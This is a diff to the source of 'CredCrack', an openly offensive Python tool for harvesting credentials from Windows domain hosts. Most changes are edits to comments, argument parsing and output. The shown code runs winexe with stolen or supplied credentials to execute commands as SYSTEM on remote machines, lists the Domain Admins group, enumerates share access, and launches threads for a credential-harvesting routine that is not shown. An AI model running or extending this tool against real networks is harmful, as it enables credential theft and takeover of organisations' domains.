@@ -1,9 +1,9 @@
 #!/usr/bin/python
 
 # CredCrack - A fast and stealthy credential harvester
-# This script harvests credentials for any given IP(s) without
-# ever touching disk. Additionally, it notifies one when
-# a domain administrator has been captured. The script is limited to 
+# This script harvests credentials for any given IP(s) and
+# notifies one when domain administrator credentials have
+# been captured. The harvester functionality is limited to 
 # systems running Windows and Powershell version 2+ 
 #
 # This program is free software: you can redistribute it and/or modify
@@ -23,7 +23,7 @@
 # Email:   jb@gojhonny.com
 # Twitter: @g0jhonny
 # Version: 1.0
-# Date:    2015-08-11
+# Date:    2015-08-13
 
 import subprocess, os, argparse, time, datetime, socket, base64, threading, Queue, hashlib, binascii, signal, sys, getpass
 from shlex import split
@@ -123,7 +123,7 @@ def enum_shares(q, username, password, domain):
     try:
         while True:
             with lock:
-		os = ""
+                os = ''
                 shares, endshares = [], []
                 rhost = q.get()
 
@@ -154,9 +154,11 @@ def enum_shares(q, username, password, domain):
                     else:
                         endshares.append(" {}OPEN      \\\\{}\\{}{} ".format(colors.lightgrey, rhost, share, colors.normal))
 
-                print "\n " + "-" * 65 + "\n " + colors.normal + "{} - {} \n ".format(rhost, os) + "-" * 65 + "\n "
-                for share in endshares:
-                    print share
+                if endshares:
+                    print "\n " + "-" * 65 + "\n " + colors.normal + "{} - {} \n ".format(rhost, os) + "-" * 65 + "\n "
+                    for share in endshares:
+                        print share
+                else: print "{}[!]{} No shares to list on {}. Ensure the correct password was used.".format(colors.red, colors.normal, rhost)
             q.task_done()
                    
     except Exception as e:
@@ -172,7 +174,8 @@ def get_das(rhost, username, password, domain):
        
     try:
         print "{}[*]{} Querying domain admin group from {}".format(colors.blue, colors.normal, rhost.rstrip())
-        da_output = subprocess.check_output(split("winexe --system //{} -U {}/{}%{} 'cmd /c net group \"Domain Admins\" /domain'".format(rhost, domain, username, password)))        
+        da_output = subprocess.check_output(split("winexe --system //{} -U {}/{}%{} 'cmd /c net group \"Domain Admins\" /domain'".format(rhost, domain, username, password)))
+        
         for line in da_output.split('\n')[8:]:
             if "The command completed" in line:
                 pass
@@ -181,6 +184,7 @@ def get_das(rhost, username, password, domain):
                     if da:
                         das.append(da)
         return das
+
     except Exception as e:
         print "{}[!]{} Unable to reach to {}".format(colors.red, colors.normal, rhost)
         return False
@@ -328,8 +332,9 @@ def main():
     required = parser.add_argument_group("Required")
     required.add_argument('-d', '--domain', required=True, help='Domain or Workstation')
     required.add_argument('-u', '--user', required=True, help='Domain username')
-    parser.add_argument('-f', '--file', help='File containing IPs to harvest creds from. One IP per line.')
-    parser.add_argument('-r', '--rhost', help='Remote host IP to harvest creds from.')
+    action = parser.add_mutually_exclusive_group(required=True)
+    action.add_argument('-f', '--file', help='File containing IPs to harvest creds from. One IP per line.')
+    action.add_argument('-r', '--rhost', help='Remote host IP to harvest creds from.')
     parser.add_argument('-es', '--enumshares', help='Examine share access on the remote IP(s)', action='store_true')
     parser.add_argument('-l', '--lhost', help='Local host IP to launch scans from.')
     parser.add_argument('-t', '--threads', help='Number of threads (default: 10)', default=10, type=int)
@@ -356,9 +361,6 @@ def main():
                     lines = [ip.strip() for ip in f.readlines() if ip.strip() and validate(ip.strip())]
                 for line in lines:
                     q.put(line)
-            else:
-                print "{}[!]{} Provide a remote host [-r] or file [-f] to examine share access\n".format(colors.red, colors.normal)
-
             if q.queue:
                 for i in range(args.threads):
                     worker = threading.Thread(target=enum_shares, args=(q, args.user, args.passwd, args.domain))
@@ -388,7 +390,6 @@ def main():
                                         for good_ip in lines:
                                             q.put(good_ip)
                                     break
-
                     if das:
                         for num in range(args.threads):
                             worker = threading.Thread(target=harvest, args=(q, args.user, args.passwd, args.domain, args.lhost))
